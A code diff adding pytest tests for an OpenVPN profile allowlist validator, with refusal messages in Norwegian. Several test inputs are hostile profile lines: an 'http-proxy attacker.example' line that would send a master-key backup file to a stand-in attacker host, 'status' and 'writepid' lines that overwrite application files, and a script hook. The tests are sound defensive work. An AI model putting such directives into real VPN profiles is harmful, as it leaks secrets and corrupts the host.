@@ -319,3 +319,95 @@ async def test_connect_never_reads_a_server_side_config_file(tmp_path):
     target.write_text("client\nremote vpn.example.com 1194\n")
     result = await openvpn.connect({"config_file": str(target)}, tag="t1")
     assert result == {"ok": False, "error": "No OpenVPN config provided"}
+
+
+# ---------------------------------------------------------------------------
+# OpenVPN: the profile is parsed as OpenVPN parses it, against an allowlist
+# ---------------------------------------------------------------------------
+
+_REAL_PROFILE = """\
+# Exported by a FortiGate / OpenVPN Access Server style tool
+client
+dev tun
+proto udp
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+verify-x509-name vpn.example.com name
+data-ciphers AES-256-GCM:AES-128-GCM
+auth SHA256
+auth-user-pass
+auth-nocache
+resolv-retry infinite
+keepalive 10 60
+setenv opt block-outside-dns
+verb 3
+<connection>
+remote vpn.example.com 1194 udp
+</connection>
+<connection>
+remote vpn.example.com 443 tcp
+http-proxy proxy.example 8080 auto
+</connection>
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIB
+-----END CERTIFICATE-----
+</ca>
+<tls-crypt>
+-----BEGIN OpenVPN Static key V1-----
+abcd
+-----END OpenVPN Static key V1-----
+</tls-crypt>
+"""
+
+
+def test_a_real_world_profile_is_accepted():
+    assert openvpn.refusal_reason(_REAL_PROFILE) is None
+
+
+@pytest.mark.parametrize(
+    ("content", "offending"),
+    [
+        # The old filter skipped everything between any <tag> and </tag>.
+        (
+            "client\n<connection>\nremote vpn.example.com 443 tcp\n"
+            "http-proxy attacker.example 8080 /var/lib/sybr-hub/.master_key_backup basic\n"
+            "</connection>\n",
+            "http-proxy",
+        ),
+        (
+            "client\n<connection>\nstatus /var/lib/sybr-hub/msp_toolkit.db\n</connection>\n",
+            "status",
+        ),
+        # OpenVPN strips the quotes; the name it acts on is `status`.
+        ('client\n"status" /var/lib/sybr-hub/msp_toolkit.db\n', "status"),
+        ("client\n'writepid' /opt/sybr-hub/main.py\n", "writepid"),
+        ("client\n--config /etc/sybr-hub/settings.json\n", "config"),
+    ],
+)
+def test_file_directives_are_found_wherever_openvpn_would_read_them(content, offending):
+    assert openvpn._reject_file_directives(content) == offending
+    assert "lese eller skrive filer" in openvpn.refusal_reason(content)
+
+
+def test_a_quoted_script_hook_is_refused():
+    assert openvpn._reject_script_directives('client\n"up" /tmp/x.sh\n') == "up"
+
+
+@pytest.mark.parametrize(
+    ("content", "offending"),
+    [
+        ("client\ndev-node /dev/net/other\n", "dev-node"),
+        ("client\ntls-export-cert /tmp/certs\n", "tls-export-cert"),
+        ("client\n<script>\nwhatever\n</script>\n", "<script>"),
+        ("client\n<ca>\n-----BEGIN CERTIFICATE-----\n", "<ca>"),  # never closed
+        ("client\n<connection>\nremote a.example 1194\n", "<connection>"),
+        ("client\n<connection>\n<connection>\n</connection>\n</connection>\n", "<connection>"),
+        ('client\nremote "unterminated 1194\n', 'remote "unterminated 1194'),
+    ],
+)
+def test_anything_outside_the_allowlist_is_refused(content, offending):
+    assert openvpn._reject_unknown_directives(content) == offending
+    assert "godtar i en klientprofil" in openvpn.refusal_reason(content)
